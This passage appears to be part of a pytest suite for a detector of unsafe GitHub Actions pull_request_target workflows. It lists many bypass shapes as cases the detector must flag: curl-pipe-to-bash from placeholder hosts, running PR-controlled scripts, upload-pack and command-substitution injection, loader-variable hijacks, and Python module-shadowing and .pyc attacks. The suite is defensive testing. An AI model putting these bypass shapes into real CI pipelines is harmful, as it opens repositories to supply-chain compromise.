                "run": 'git fetch origin "$H"',
            },
            {"run": 'git show "$(cat head.txt)":setup.py | python -'},
        ]),
        _prt([
            {
                "uses": "some-org/checkout-pr@v1",
                "with": {"sha": "${{ github.event.pull_request.head.sha }}"},
            }
        ]),
        _prt([{"uses": "./.github/actions/run", "with": {"ref": "refs/pull/1/head"}}]),
        _prt([
            {
                "uses": "actions/github-script@v7",
                "with": {"script": "run('${{ github.event.pull_request.head.sha }}')"},
            }
        ]),
        # Round-2 adversarial bypasses.
        _prt(
            [{"uses": "actions/checkout@v6", "with": {"ref": "${{ env.HEAD }}"}}],
            env={"HEAD": "${{ github.event.pull_request.head.sha }}"},
        ),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ steps.pr.outputs.sha }}"},
            }
        ]),
        _prt([
            {
                "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git fetch origin "$HEAD"\ngit diff "$BASE" "$HEAD" > payload; bash payload',
            }
        ]),
        _prt([
            {
                "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git fetch origin "$HEAD"\ngit cat-file --filters "$HEAD":run.sh | sh',
            }
        ]),
        _prt([
            {
                "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git fetch origin "$HEAD"\ngit \\\n  checkout "$HEAD"',
            }
        ]),
        _prt([
            {
                "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
                "run": 'curl -sL "https://codeload.github.com/o/r/tar.gz/$HEAD" | tar -xz',
            }
        ]),
        {
            "on": ["pull_request_target"],
            "jobs": {
                "j": {
                    "uses": "./.github/workflows/x.yml",
                    "with": {"ref": "${{ github.event.pull_request.head.sha }}"},
                }
            },
        },
        {
            "on": "push",
            True: ["pull_request_target"],
            "jobs": {
                "j": {
                    "steps": [
                        {
                            "uses": "actions/checkout@v6",
                            "with": {"ref": "refs/pull/1/head"},
                        }
                    ]
                }
            },
        },
    ],
)
def test_detector_flags_pull_request_head_materialization(
    workflow: dict[Any, Any],
) -> None:
    assert pull_request_target_violations(workflow, "synthetic")


@pytest.mark.parametrize(
    "workflow",
    [
        # Base-ref checkout and inert object fetch + diff are allowed.
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ github.event.pull_request.base.sha }}"},
            }
        ]),
        _prt([{"uses": "actions/checkout@v6"}]),
        _prt([
            {
                "env": {"HEAD_SHA": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git fetch --no-tags origin "$HEAD_SHA"\ngit diff --name-only "$BASE" "$HEAD_SHA"',
            }
        ]),
        _prt([
            {
                "env": {"HEAD_SHA": "${{ github.event.pull_request.head.sha }}"},
                "run": 'git fetch --no-tags origin "$HEAD_SHA"\ngit cat-file -e "${HEAD_SHA}^{commit}"',
            },
            {"run": "git -C trusted ls-files > files.txt\ngit diff --name-only a b"},
        ]),
        # PR fields as data for API calls.
        _prt([
            {
                "uses": "actions/github-script@v7",
                "env": {"EXPECTED_HEAD": "${{ github.event.pull_request.head.sha }}"},
            }
        ]),
        # Head checkout is fine in an unprivileged pull_request workflow.
        {
            True: {"pull_request": {}},
            "jobs": {
                "j": {
                    "steps": [
                        {
                            "uses": "actions/checkout@v6",
                            "with": {
                                "ref": "${{ github.event.pull_request.head.sha }}"
                            },
                        }
                    ]
                }
            },
        },
    ],
)
def test_detector_allows_base_code_and_pr_data(workflow: dict[Any, Any]) -> None:
    assert pull_request_target_violations(_pinned(workflow), "synthetic") == []


_TAINTED_FETCH = {
    "env": {"HEAD": "${{ github.event.pull_request.head.sha }}"},
    "run": 'git fetch --no-tags origin "$HEAD"',
}


@pytest.mark.parametrize(
    "script",
    [
        # Round-3 adversarial and secondary-review bypasses.
        'git diff --name-only --patch "$BASE" "$HEAD" | sed -n \'s/^+//p\' | sh',
        'git --work-tree=w checkout "$HEAD" -- .',
        'git --git-dir=.git show "$HEAD":x.sh | sh',
        "git fetch --upload-pack='sh -c id' origin \"$HEAD\"",
        'git cat-file -p "$HEAD":run.sh | sh',
        'out=$(git diff "$BASE" "$HEAD") && echo "$out" | sh',
        'command git checkout "$HEAD"',
        # Final-head secondary-review bypasses.
        '/usr/bin/git show "$HEAD":x.sh | sh',
        '"$(command -v git)" show "$HEAD":x.sh | sh',
        'G=git; $G show "$HEAD":x.sh | sh',
        'git -c core.hooksPath=h fetch origin "$HEAD"',
        "git status --short --ignore-submodules=none",
        "git status --porcelain=v1 --untracked-files=all --find-renames",
    ],
)
def test_detector_flags_non_plumbing_git_in_pr_ref_jobs(script: str) -> None:
    workflow = _prt([_TAINTED_FETCH, {"run": script}])
    assert pull_request_target_violations(workflow, "synthetic", root=None)


def test_detector_scans_local_reusable_workflows_and_composite_actions(
    tmp_path: Path,
) -> None:
    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    (workflows / "materialize.yml").write_text(
        "on: workflow_call\n"
        "jobs:\n"
        "  run:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v6\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n",
        encoding="utf-8",
    )
    action = tmp_path / ".github/actions/pr"
    action.mkdir(parents=True)
    (action / "action.yml").write_text(
        "runs:\n"
        "  using: composite\n"
        "  steps:\n"
        "    - shell: bash\n"
        "      run: git checkout ${{ github.event.pull_request.head.sha }}\n",
        encoding="utf-8",
    )
    reusable = {
        True: {"pull_request_target": {}},
        "jobs": {"j": {"uses": "./.github/workflows/materialize.yml"}},
    }
    composite = _prt([{"uses": "./.github/actions/pr"}])
    remote = {
        True: {"pull_request_target": {}},
        "jobs": {"j": {"uses": "org/repo/.github/workflows/x.yml@v1"}},
    }
    for workflow in (reusable, composite, remote):
        assert pull_request_target_violations(workflow, "synthetic", root=tmp_path)


@pytest.mark.parametrize(
    "workflow",
    [
        # Final-head review bypasses: no PR-ref expression appears anywhere.
        _prt([
            {
                "run": 'H=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")\ngit fetch origin "$H"'
            },
            {"run": "git checkout FETCH_HEAD && make"},
        ]),
        _prt(
            [{"uses": "org/checkout-pr@0123456789abcdef0123456789abcdef01234567"}],
            env={"HEAD_SHA": "${{ github.event.pull_request.head.sha }}"},
        ),
        _prt([{"run": 'echo " #"; git checkout "$HEAD"'}]),
        _prt([
            {
                "uses": "actions/github-script@v7",
                "with": {
                    "script": "await exec.exec('git', ['checkout', process.env.H])"
                },
            }
        ]),
    ],
)
def test_detector_fails_closed_without_explicit_pr_refs(
    workflow: dict[Any, Any],
) -> None:
    assert pull_request_target_violations(workflow, "synthetic", root=None)


def test_detector_expands_nested_composite_actions(tmp_path: Path) -> None:
    for name, body in {
        "a": "    - uses: ./.github/actions/b\n",
        "b": (
            "    - uses: actions/checkout@v6\n"
            "      with:\n"
            "        ref: ${{ github.event.pull_request.head.sha }}\n"
        ),
    }.items():
        action = tmp_path / ".github/actions" / name
        action.mkdir(parents=True)
        (action / "action.yml").write_text(
            f"runs:\n  using: composite\n  steps:\n{body}", encoding="utf-8"
        )
    violations = pull_request_target_violations(
        _prt([{"uses": "./.github/actions/a"}]), "synthetic", root=tmp_path
    )
    assert any("checks out untrusted ref" in v for v in violations)


def _prt_review(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
    # pull_request_review shares the workflow but resolves github.sha to the
    # PR merge ref.
    return {
        True: {
            "pull_request_target": {"branches": ["main"]},
            "pull_request_review": {},
        },
        "jobs": {"j": {"steps": steps, **job}},
    }


_GUARD = '${{ !contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name) }}'


@pytest.mark.parametrize(
    "workflow",
    [
        # Frozen-head review round (6d7085d5) bypass shapes.
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"repository": "attacker/repo", "ref": "main"},
            },
            {"run": "bash ci/run.sh"},
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {
                    "ref": "${{ github['event']['pull_request']['head']['sha'] }}"
                },
            }
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {
                    "ref": "${{ format('refs/{0}/{1}/head', 'pull', github.event.number) }}"
                },
            }
        ]),
        _prt([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ steps.pr.outputs.sha }}"},
            }
        ]),
        _prt_review([
            {"uses": "actions/checkout@v6", "with": {"ref": "${{ github.sha }}"}}
        ]),
        _prt_review([{"uses": "actions/checkout@v6"}]),
        _prt([
            {
                "shell": "bash -c 'git fetch origin \"$HEAD_SHA\" && git checkout FETCH_HEAD && bash {0}'",
                "run": "echo hi",
            }
        ]),
        {
            True: {"pull_request_target": {}},
            "defaults": {"run": {"shell": "python {0}"}},
            "jobs": {"j": {"steps": [{"run": "print(1)"}]}},
        },
        _prt([
            {
                "uses": "actions/github-script@v7",
                "with": {
                    "script": (
                        "const {data} = await github.rest.repos.getContent({owner, repo, "
                        "path: 'x.sh', ref: context.payload.pull_request.head.sha});"
                        "require('fs').writeFileSync('payload.sh', Buffer.from(data.content, 'base64'));"
                    )
                },
            },
            {"run": "bash payload.sh"},
        ]),
        _prt([
            {
                "uses": "actions/download-artifact@v4",
                "with": {
                    "name": "x",
                    "run-id": "123",
                    "github-token": "${{ github.token }}",
                },
            },
            {"run": "bash x/run.sh"},
        ]),
        _prt([
            {
                "run": (
                    'SHA=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")\n'
                    'curl -sL "https://api.github.com/repos/o/r/tarball/$SHA" | tar -xz\n'
                    "bash */run.sh"
                )
            }
        ]),
    ],
)
def test_detector_rejects_frozen_head_review_bypasses(workflow: dict[Any, Any]) -> None:
    assert pull_request_target_violations(workflow, "synthetic", root=None)


@pytest.mark.parametrize(
    "workflow",
    [
        _prt_review([
            {
                "if": _GUARD,
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ github.sha }}"},
            }
        ]),
        _prt_review(
            [
                {
                    "uses": "actions/checkout@v6",
                    "with": {
                        "ref": "${{ github.event.merge_group.head_sha || github.sha }}"
                    },
                }
            ],
            **{"if": _GUARD},
        ),
        _prt_review([
            {
                "uses": "actions/checkout@v6",
                "with": {"ref": "${{ github.event.pull_request.base.sha }}"},
            }
        ]),
        _prt([
            {
                "run": (
                    'curl -sSfL -o rg.tgz "https://github.com/o/r/releases/download/1/rg.tgz"\n'
                    'echo "' + "a" * 64 + '  rg.tgz" | sha256sum -c -'
                )
            }
        ]),
        _prt([
            {
                "uses": "actions/download-artifact@v4",
                "with": {"name": "env", "path": "ci-fast"},
            }
        ]),
    ],
)
def test_detector_allows_guarded_and_pinned_trusted_shapes(
    workflow: dict[Any, Any],
) -> None:
    assert (
        pull_request_target_violations(_pinned(workflow), "synthetic", root=None) == []
    )


_H = {"H": "${{ github.event.pull_request.head.sha }}"}


@pytest.mark.parametrize(
    "workflow",
    [
        # Review round on ba8544a6.
        {
            True: {"pull_request_target": {}},
            "jobs": {"j": {"steps": [{"uses": "actions/checkout@" + "0" * 40}]}},
        },
        _prt([{"run": "true"}], container={"image": "${{ github.head_ref }}"}),
        _prt([{"run": "true"}], services={"pwn": {"image": "ghcr.io/o/pwn:latest"}}),
        _prt([
            {
                "uses": "actions/cache/save@" + "0" * 40,
                "with": {"path": "x", "key": "k"},
            }
        ]),
        _prt([
            {
                "run": 'pip install "git+https://github.com/o/r@${{ github.event.pull_request.head.sha }}"'
            }
        ]),
        _prt([{"run": 'npx "github:o/r#${{ github.event.pull_request.head.sha }}"'}]),
        _prt([
            {
                "env": _H,
                "run": 'git fetch origin "$H"\ngit diff --name-only "$B" "$H" | bash',
            }
        ]),
        _prt([
            {
                "run": 'curl -sSfL https://example.invalid/i.sh | bash\necho "x  f" | sha256sum -c -'
            }
        ]),
        _prt([{"run": "gh run download 123 -n env && bash env/run.sh"}]),
        _prt([{"env": {"G": "git"}, "run": "$G checkout FETCH_HEAD"}]),
        _prt([{"run": '\\git checkout "$X"'}]),
        _prt([{"run": '"${GIT:-git}" checkout FETCH_HEAD'}]),
        _prt([{"env": _H, "run": 'git fetch origin "$H:refs/heads/x"'}]),
        _prt_review([
            {
                "if": '${{ !contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name) || true }}',
                "uses": "actions/checkout@" + "0" * 40,
                "with": {"ref": "${{ github.sha }}"},
            }
        ]),
        _prt([
            {
                "uses": "actions/github-script@" + "0" * 40,
                "with": {
                    "script": 'const r = await github.graphql(`{repository(owner:"o",name:"r"){object(expression:"x"){... on Blob {text}}}}`)'
                },
            }
        ]),
        _prt([
            {
                "uses": "actions/github-script@" + "0" * 40,
                "with": {
                    "script": "await github.rest.repos.compareCommits({owner, repo, base, head, mediaType: {format: 'diff'}})"
                },
            }
        ]),
    ],
)
def test_detector_rejects_round_ba8544a6_bypasses(workflow: dict[Any, Any]) -> None:
    assert pull_request_target_violations(workflow, "synthetic", root=None)


def test_reach_collects_nested_local_files_and_checkouts(tmp_path: Path) -> None:
    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    (workflows / "callee.yml").write_text(
        "on: workflow_call\njobs:\n  c:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: ./.github/actions/outer\n",
        encoding="utf-8",
    )
    for name, body in {
        "outer": "    - uses: ./.github/actions/inner\n",
        "inner": "    - uses: actions/checkout@" + "0" * 40 + "\n",
    }.items():
        action = tmp_path / ".github/actions" / name
        action.mkdir(parents=True)
        (action / "action.yml").write_text(
            f"runs:\n  using: composite\n  steps:\n{body}", encoding="utf-8"
        )
    reach: dict[str, Any] = {"files": set(), "checkout": False}
    workflow = {
        True: {"pull_request_target": {}},
        "jobs": {"j": {"uses": "./.github/workflows/callee.yml"}},
    }
    violations = pull_request_target_violations(
        workflow, "synthetic", root=tmp_path, reach=reach
    )
    assert reach["checkout"] is True
    assert {Path(path).relative_to(tmp_path).as_posix() for path in reach["files"]} == {
        ".github/workflows/callee.yml",
        ".github/actions/outer/action.yml",
        ".github/actions/inner/action.yml",
    }
    # The nested checkout needs the caller's branch filter.
    assert any(
        "not limited to branches: [main]" in violation for violation in violations
    )


_SHA = "0" * 40
_GUARD_EXPR = '!contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name)'


@pytest.mark.parametrize(
    ("workflow", "reason"),
    [
        # Review round on 14e28c2a; each case names the rule that must fire.
        (
            {
                True: {"pull_request_target": {}},
                "jobs": {"j": {"steps": [{"uses": "./.github/actions/co"}]}},
            },
            "uninspectable local action",
        ),
        (
            _prt([
                {
                    "uses": "actions/upload-artifact@" + _SHA,
                    "with": {
                        "name": "x",
                        "path": "${{ github.event.pull_request.body }}",
                    },
                }
            ]),
            "feeds event field github.event.pull_request.body",
        ),
        (
            _prt([{"env": {"BASH_ENV": "/tmp/p"}, "run": "true"}]),
            "loader environment variable BASH_ENV",
        ),
        (
            _prt([{"env": {"GIT_CONFIG_COUNT": "1"}, "run": "true"}]),
            "loader environment variable GIT_CONFIG_COUNT",
        ),
        (
            _prt([{"env": {"NODE_OPTIONS": "--require ./x.js"}, "run": "true"}]),
            "loader environment variable NODE_OPTIONS",
        ),
        (
            _prt([{"env": {"X": "$(id)"}, "run": "true"}]),
            "command substitution in env X",
        ),
        (
            _prt([
                {"uses": "astral-sh/setup-uv@" + _SHA, "with": {"enable-cache": True}}
            ]),
            "setup-uv without enable-cache: false",
        ),
        (
            _prt([
                {
                    "uses": "actions/github-script@" + _SHA,
                    "with": {"script": "require('./payload.js')"},
                }
            ]),
            "fetches repository content in github-script",
        ),
        (
            _prt([
                {
                    "uses": "actions/github-script@" + _SHA,
                    "with": {
                        "script": "await github.rest.actions.downloadArtifact({owner, repo, artifact_id: 1, archive_format: 'zip'})"
                    },
                }
            ]),
            "fetches repository content in github-script",
        ),
        (_prt([{"run": 'g\\it checkout "$X"'}]), "`git checkout`"),
        (_prt([{"run": 'gi""t checkout "$X"'}]), "`git checkout`"),
        (
            _prt([
                {
                    "run": 'echo "a  f" | sha256sum -c -\nbash <(curl -sL https://example.invalid/i.sh)'
                }
            ]),
            "pipes command output into an interpreter",
        ),
        (
            _prt([
                {
                    "run": 'curl -sSfL -o payload https://example.invalid/p\necho "a  other" | sha256sum -c -\nbash payload'
                }
            ]),
            "downloads payload without a sha256sum -c pin on it",
        ),
        (
            _prt([{"run": "pip install https://example.invalid/payload.whl"}]),
            "installs packages from a URL",
        ),
        (
            _prt_review([
                {
                    "if": "${{ format('x){0}', true && " + _GUARD_EXPR + " && true) }}",
                    "uses": "actions/checkout@" + _SHA,
                    "with": {"ref": "${{ github.sha }}"},
                }
            ]),
            "without the non-PR-event guard",
        ),
    ],
)
def test_detector_rejects_round_14e28c2a_bypasses(
    workflow: dict[Any, Any], reason: str
) -> None:
    violations = pull_request_target_violations(workflow, "synthetic", root=None)
    assert any(reason in violation for violation in violations), violations


def test_reusable_workflow_keeps_the_callers_merge_ref_triggers(tmp_path: Path) -> None:
    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    (workflows / "callee.yml").write_text(
        "on: workflow_call\njobs:\n  c:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@" + _SHA + "\n",
        encoding="utf-8",
    )
    caller = {
        True: {
            "pull_request_target": {"branches": ["main"]},
            "pull_request_review": {},
        },
        "jobs": {"j": {"uses": "./.github/workflows/callee.yml"}},
    }
    violations = pull_request_target_violations(caller, "synthetic", root=tmp_path)
    assert any(
        "without the non-PR-event guard" in violation for violation in violations
    ), violations


@pytest.mark.parametrize(
    ("workflow", "reason"),
    [
        # Review round on 95e282b1.
        (
            _prt([
                {
                    "env": _H,
                    "run": '/usr/bin/curl -sL "https://example.invalid/$H/run.sh" | /bin/bash',
                }
            ]),
            "pipes command output into an interpreter",
        ),
        (
            _prt([{"run": "/usr/bin/curl -sSfL -o p https://example.invalid/p"}]),
            "downloads p without a sha256sum -c pin",
        ),
        (
            _prt(
                [
                    {
                        "uses": "actions/upload-artifact@" + _SHA,
                        "with": {"name": "x", "path": "${{ env.P }}"},
                    }
                ],
                env={"P": "${{ github.event.pull_request.body }}"},
            ),
            "feeds event-derived env.P into input path",
        ),
        (
            _prt([
                {
                    "uses": "actions/upload-artifact@" + _SHA,
                    "with": {
                        "name": "x",
                        "path": "${{ fromJSON(toJSON(github.event)).pull_request.body }}",
                    },
                }
            ]),
            "feeds the raw event payload into input path",
        ),
        (
            _prt([
                {
                    "env": _H,
                    "run": 'git fetch origin "$H"\ngit diff --name-only "$B" "$H" docs/',
                }
            ]),
            "git diff with extra operands",
        ),
        (
            _prt([
                {
                    "run": "git status --porcelain=v1 --untracked-files=all .github/workflows"
                }
            ]),
            "git status with extra operands",
        ),
        (
            _prt([
                {
                    "run": "curl -sSfL -o payload https://example.invalid/p\necho 'bad  payload' | sha256sum -c - || true\nbash payload"
                }
            ]),
            "masks a sha256sum failure",
        ),
        (
            _prt([
                {
                    "run": "curl -sSfL -o payload https://example.invalid/p\nsha256sum payload > sum\nsha256sum -c sum\nbash payload"
                }
            ]),
            "downloads payload without a sha256sum -c pin",
        ),
    ],
)
def test_detector_rejects_round_95e282b1_bypasses(
    workflow: dict[Any, Any], reason: str
) -> None:
    violations = pull_request_target_violations(workflow, "synthetic", root=None)
    assert any(reason in violation for violation in violations), violations


def test_trusted_script_runs_require_isolated_mode() -> None:
    violations = pull_request_target_violations(
        _prt([
            {"run": "python3 .runtime-os-trusted/scripts/ci/runtime_os_adapter.py --x"}
        ]),
        "synthetic",
        root=None,
    )
    assert any("without python -I" in violation for violation in violations), violations
    assert not [
        v
        for v in pull_request_target_violations(
            _prt([
                {"run": "python3 -I trusted/scripts/review_receipt_validator.py --x"}
            ]),
            "synthetic",
            root=None,
        )
        if "without python -I" in v
    ]


@pytest.mark.parametrize(
    "entrypoint",
    ["scripts/ci/runtime_os_adapter.py", "scripts/review_receipt_validator.py"],
)
def test_isolated_mode_blocks_sibling_stdlib_shadowing(
    tmp_path: Path, entrypoint: str
) -> None:
    """Behavioural: a new module beside a pinned privileged script (no pinned
    file changes) runs under plain python3 but not under python3 -I, which is
    how the advisory invokes it."""
    import shutil
    import subprocess
    import sys

    for relative in PRIVILEGED_SCRIPTS:
        (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(ROOT / relative, tmp_path / relative)
    for shadow in ("scripts/ci/argparse.py", "scripts/argparse.py", "scripts/hmac.py"):
        (tmp_path / shadow).write_text(
            "raise SystemExit('SHADOWED')\n", encoding="utf-8"
        )
    plain = subprocess.run(
        [sys.executable, entrypoint, "--help"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
    )
    assert "SHADOWED" in plain.stderr  # negative control: the attack is real
    isolated = subprocess.run(
        [sys.executable, "-I", entrypoint, "--help"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
    )
    assert (
        isolated.returncode == 0 and "SHADOWED" not in isolated.stderr + isolated.stdout
    )
    workflow_text = (WORKFLOWS / "ci-runtime-os-advisory.yml").read_text(
        encoding="utf-8"
    )
    prefix = ".runtime-os-trusted/" if "ci/" in entrypoint else "trusted/"
    assert (
        f'python3 -I -X pycache_prefix="$RUNNER_TEMP/runtime-os-pycache" {prefix}{entrypoint}'
        in workflow_text
    )


def test_pycache_prefix_ignores_committed_bytecode(tmp_path: Path) -> None:
    """Behavioural: an unchecked-hash .pyc committed beside the spec-loaded
    classifier core runs in place of the pinned source under plain -I
    (negative control) but is ignored with -X pycache_prefix=<fresh dir>."""
    import importlib.util
    import os
    import py_compile
    import shutil
    import subprocess
    import sys

    for relative in PRIVILEGED_SCRIPTS:
        (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(ROOT / relative, tmp_path / relative)
    shutil.copytree(ROOT / "ci/runtime-os", tmp_path / "ci/runtime-os")
    evil = tmp_path / "evil_core.py"
    evil.write_text("raise SystemExit('PWNED_VIA_PYC')\n", encoding="utf-8")
    core = tmp_path / "scripts/ci_risk_classifier_core.py"
    py_compile.compile(
        str(evil),
        cfile=importlib.util.cache_from_source(str(core)),
        dfile=str(core),
        invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
    )
    body = tmp_path / "body.md"
    body.write_text("", encoding="utf-8")
    argv = [
        "scripts/ci/runtime_os_adapter.py",
        "--changed-files-json",
        '["docs/x.md"]',
        "--event-name",
        "pull_request",
        "--body-file",
        str(body),
    ]
    env = {key: value for key, value in os.environ.items() if key != "GITHUB_OUTPUT"}
    plain = subprocess.run(
        [sys.executable, "-I", *argv],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        env=env,
    )
    assert "PWNED_VIA_PYC" in plain.stderr  # negative control: the bypass is real
    prefixed = subprocess.run(
        [
            sys.executable,
            "-I",
            "-X",
            f"pycache_prefix={tmp_path / 'fresh-pycache'}",
            *argv,
        ],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        env=env,
    )
    assert "PWNED_VIA_PYC" not in prefixed.stderr + prefixed.stdout, prefixed.stderr


@pytest.mark.parametrize(
    "run",
    [
        "/usr/bin/python3 -I trusted/scripts/review_receipt_validator.py",
        "python3.11 -I trusted/scripts/review_receipt_validator.py",
        "python3 -X utf8 trusted/scripts/review_receipt_validator.py",
        'python3 ".runtime-os-trusted/scripts/ci/runtime_os_adapter.py"',
        "python3 ./trusted/scripts/review_receipt_validator.py",
    ],
)
def test_isolation_rule_sees_alternate_invocations(run: str) -> None:
    violations = pull_request_target_violations(
        _prt([{"run": run}]), "synthetic", root=None
    )
    assert any(
        "without python -I" in v or "without -X pycache_prefix" in v for v in violations
    ), violations


def test_env_taint_is_transitive_into_action_inputs() -> None:
    workflow = {
        True: {"pull_request_target": {"branches": ["main"]}},
        "env": {"PR_PATH": "${{ github.event.pull_request.body }}"},
        "jobs": {
            "j": {
                "env": {"INDIRECT_PATH": "${{ env.PR_PATH }}"},
                "steps": [
                    {
                        "uses": "actions/upload-artifact@" + "0" * 40,
                        "with": {"name": "x", "path": "${{ env.INDIRECT_PATH }}"},
                    }
                ],
            }
        },
    }
    violations = pull_request_target_violations(workflow, "synthetic", root=None)
    assert any("event-derived env.INDIRECT_PATH" in v for v in violations), violations


def test_symlinks_in_the_privileged_set_are_reported(tmp_path: Path) -> None:
    action = tmp_path / ".github/actions/co"
    (action / "real").mkdir(parents=True)
    (action / "action.yml").write_text(
        "runs:\n  using: composite\n  steps: []\n", encoding="utf-8"
    )
    (action / "real/helper.sh").write_text("echo hi\n", encoding="utf-8")
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "helper.sh").write_text("echo changed\n", encoding="utf-8")
    (action / "link").symlink_to(shared, target_is_directory=True)
    (action / "file-link.sh").symlink_to(shared / "helper.sh")
    paths, symlinks = _privileged_file_set({action / "action.yml"}, base=tmp_path)
    assert {p.relative_to(action).as_posix() for p in paths} == {
        "action.yml",
        "real/helper.sh",
    }
    assert [Path(link).name for link in symlinks] == ["file-link.sh", "link"]


@pytest.mark.parametrize(
    "run",
    [
        "python3 -I -Xpycache_prefix=/x trusted/scripts/review_receipt_validator.py",
        "python3 -I -X pycache_prefix=. trusted/scripts/review_receipt_validator.py",
        'python3 -I -X pycache_prefix="$GITHUB_WORKSPACE/p" trusted/scripts/review_receipt_validator.py',
    ],
)
def test_pycache_prefix_must_be_runner_temp(run: str) -> None:
    violations = pull_request_target_violations(
        _prt([{"run": run}]), "synthetic", root=None
    )
    assert any("under $RUNNER_TEMP" in v for v in violations), violations


def test_runner_temp_pycache_prefix_is_accepted() -> None:
    run = 'python3 -I -X pycache_prefix="$RUNNER_TEMP/runtime-os-pycache" trusted/scripts/review_receipt_validator.py'
    violations = pull_request_target_violations(
        _prt([{"run": run}]), "synthetic", root=None
    )
    assert not [v for v in violations if "pycache_prefix" in v or "python -I" in v], (
        violations
    )


def test_symlinked_parent_directory_is_reported(tmp_path: Path) -> None:
    # Moving scripts/ci elsewhere and symlinking it back keeps every pinned
    # byte identical; the component check must still flag it.
    real = tmp_path / "a/b/c/ci"
    real.mkdir(parents=True)
    (real / "runtime_os_adapter.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts/ci").symlink_to(real, target_is_directory=True)
    assert _symlinked_component(tmp_path / "scripts/ci/runtime_os_adapter.py", tmp_path)
    assert not _symlinked_component(real / "runtime_os_adapter.py", tmp_path)


def test_adapter_refuses_to_run_through_a_symlinked_directory(tmp_path: Path) -> None:
    import shutil
    import subprocess
    import sys

    real = tmp_path / "elsewhere/ci"
    real.mkdir(parents=True)
    shutil.copy2(
        ROOT / "scripts/ci/runtime_os_adapter.py", real / "runtime_os_adapter.py"
    )
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts/ci").symlink_to(real, target_is_directory=True)
    result = subprocess.run(
        [sys.executable, "-I", "scripts/ci/runtime_os_adapter.py", "--help"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
    )
    assert result.returncode != 0 and "symlinked path" in result.stderr


def test_definition_guard_fails_closed_on_criss_cross_history(tmp_path: Path) -> None:
    """Execute the workflow's own guard step against a criss-cross history in
    which a three-dot diff picks a merge base that hides the candidate change."""
    import subprocess

    repo = tmp_path / ".runtime-os-trusted"
    repo.mkdir()
    env = {
        **os.environ,
        "GIT_AUTHOR_NAME": "t",
        "GIT_AUTHOR_EMAIL": "t@x",
        "GIT_COMMITTER_NAME": "t",
        "GIT_COMMITTER_EMAIL": "t@x",
    }

    def git(*args: str) -> str:
        return subprocess.run(
            ["git", "-C", str(repo), *args],
            check=True,
            capture_output=True,
            text=True,
            env=env,
        ).stdout.strip()

    candidate = repo / ".github/workflows/ci-runtime-os-candidate.yml"
    candidate.parent.mkdir(parents=True)
    git("init", "-q", "-b", "main")
    candidate.write_text("OLD\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "mb0")
    git("branch", "feature")
    candidate.write_text("NEW\n", encoding="utf-8")
    git("commit", "-qam", "mb2 on main")
    mb2 = git("rev-parse", "HEAD")
    git("checkout", "-q", "feature")
    (repo / "f.txt").write_text("f\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "mb1 on feature")
    mb1 = git("rev-parse", "HEAD")
    git("checkout", "-q", "main")
    git("merge", "-q", "--no-ff", "-m", "B", mb1)
    base = git("rev-parse", "HEAD")
    git("checkout", "-q", "-b", "attacker", mb1)
    git("merge", "-q", "--no-ff", "-m", "H", mb2, "-X", "theirs")
    candidate.write_text("OLD\n", encoding="utf-8")
    git("commit", "-qam", "resolve to OLD")
    head = git("rev-parse", "HEAD")
    assert len(git("merge-base", "--all", base, head).splitlines()) > 1
    step = next(
        s
        for s in _load(WORKFLOWS / "ci-runtime-os-advisory.yml")["jobs"]["preflight"][
            "steps"
        ]
        if s.get("id") == "definition"
    )
    output = tmp_path / "out"
    output.write_text("", encoding="utf-8")
    subprocess.run(
        ["bash", "-c", step["run"]],
        cwd=tmp_path,
        check=True,
        env={**env, "BASE_SHA": base, "HEAD_SHA": head, "GITHUB_OUTPUT": str(output)},
    )
    assert (
        output.read_text(encoding="utf-8").strip()
        == "candidate_definition_changed=true"
    )


def test_symlinked_composite_action_directory_is_reported(tmp_path: Path) -> None:
    real = tmp_path / "variants/a"
    real.mkdir(parents=True)
    (real / "action.yml").write_text(
        "runs:\n  using: composite\n  steps: []\n", encoding="utf-8"
    )
    (real / "payload.sh").write_text("echo a\n", encoding="utf-8")
    (tmp_path / ".github/actions").mkdir(parents=True)
    (tmp_path / ".github/actions/co").symlink_to(real, target_is_directory=True)
    paths, symlinks = _privileged_file_set(
        {tmp_path / ".github/actions/co/action.yml"}, base=tmp_path
    )
    assert paths == set()
    assert any(link.endswith(".github/actions/co/action.yml") for link in symlinks)
